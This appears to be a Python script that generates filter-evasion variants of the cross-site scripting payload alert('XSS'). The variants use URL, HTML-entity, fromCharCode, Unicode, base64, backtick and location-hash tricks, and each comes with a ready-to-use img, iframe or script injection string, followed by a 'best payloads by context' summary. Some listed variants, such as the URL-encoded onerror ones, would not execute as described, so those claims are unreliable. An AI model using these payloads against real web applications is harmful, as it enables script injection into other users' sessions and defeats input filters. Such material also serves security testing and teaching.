import urllib.parse
import html

def generate_xss_payloads():
    """Generate various encoded versions of alert('XSS') payload"""
    base_payload = "alert('XSS')"
    
    print("[+] Generating XSS payload variants for: alert('XSS')")
    print("=" * 60)
    
    # 1. URL Encoding
    url_encoded = urllib.parse.quote(base_payload)
    print(f"[1] URL Encoded:")
    print(f"    Original: {base_payload}")
    print(f"    Encoded:  {url_encoded}")
    print(f"    Usage:    <img src=x onerror={url_encoded}>")
    print()
    
    # 2. Double URL Encoding
    double_url_encoded = urllib.parse.quote(urllib.parse.quote(base_payload))
    print(f"[2] Double URL Encoded:")
    print(f"    Encoded:  {double_url_encoded}")
    print(f"    Usage:    <img src=x onerror={double_url_encoded}>")
    print()
    
    # 3. HTML Entity Encoding (numeric)
    numeric_entities = ''.join(f'&#{ord(c)};' for c in base_payload)
    print(f"[3] HTML Entity (Numeric):")
    print(f"    Encoded:  {numeric_entities}")
    print(f"    Usage:    <img src=x onerror={numeric_entities}>")
    print()
    
    # 4. HTML Entity Encoding (hex)
    hex_entities = ''.join(f'&#x{ord(c):x};' for c in base_payload)
    print(f"[4] HTML Entity (Hex):")
    print(f"    Encoded:  {hex_entities}")
    print(f"    Usage:    <img src=x onerror={hex_entities}>")
    print()
    
    # 5. Mixed encoding - bypass filters that check for 'alert'
    # Using String.fromCharCode to construct the string
    char_codes = ','.join(str(ord(c)) for c in base_payload)
    from_charcode_payload = f"String.fromCharCode({char_codes})"
    print(f"[5] String.fromCharCode (obfuscated):")
    print(f"    Payload:  {from_charcode_payload}")
    print(f"    Usage:    eval({from_charcode_payload})")
    print(f"    Full:     <img src=x onerror=eval({from_charcode_payload})>")
    print()
    
    # 6. Split string concatenation
    # Breaking up 'alert' to avoid detection
    split_payload = "al" + "ert" + "('XSS')"
    print(f"[6] String Splitting:")
    print(f"    Payload:  {split_payload}")
    print(f"    Usage:    <img src=x onerror={split_payload}>")
    print()
    
    # 7. Unicode escapes within string
    # Only encoding the 'alert' part, preserving 'XSS'
    unicode_escaped = ""
    for c in base_payload:
        if c in "alert":
            unicode_escaped += f"\\u{ord(c):04x}"
        else:
            unicode_escaped += c
    print(f"[7] Unicode Escaped (selective):")
    print(f"    Encoded:  {unicode_escaped}")
    print(f"    Usage:    <img src=x onerror=eval(\"{unicode_escaped}\")>")
    print()
    
    # 8. Base64 encoded for data: URL contexts
    import base64
    b64_encoded = base64.b64encode(base_payload.encode()).decode()
    print(f"[8] Base64 Encoded:")
    print(f"    Encoded:  {b64_encoded}")
    print(f"    Usage:    <iframe src=\"data:text/html;base64,{b64_encoded}\"></iframe>")
    print(f"    or:       eval(atob('{b64_encoded}'))")
    print()
    
    # 9. Parenthesis and quote alternatives
    # Using backticks and other tricks
    backtick_payload = "alert`XSS`"
    print(f"[9] Backtick Alternative:")
    print(f"    Payload:  {backtick_payload}")
    print(f"    Usage:    <img src=x onerror={backtick_payload}>")
    print()
    
    # 10. Location hash technique
    hash_payload = "location.hash.slice(1)"
    print(f"[10] Location Hash (requires URL control):")
    print(f"    HTML:     <img src=x onerror=eval({hash_payload})>")
    print(f"    URL:      http://target.com/page#alert('XSS')")
    print()
    
    # Summary of most effective for different contexts
    print("=" * 60)
    print("[+] Summary - Best payloads by context:")
    print()
    print("HTML Context:        <img src=x onerror=alert('XSS')>")
    print("Attribute Context:   <img src=x onerror=alert&#x28;'XSS'&#x29;>")
    print("JS String Context:   <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>")
    print("Filter Bypass:       <img src=x onerror=al\\u0065rt('XSS')>")
    print()
    print("[+] Note: The uppercase 'XSS' in the alert is preserved in all payloads")
    
    return {
        'original': base_payload,
        'url_encoded': url_encoded,
        'double_url_encoded': double_url_encoded,
        'html_numeric': numeric_entities,
        'html_hex': hex_entities,
        'from_charcode': from_charcode_payload,
        'split': split_payload,
        'unicode_escaped': unicode_escaped,
        'base64': b64_encoded,
        'backtick': backtick_payload
    }

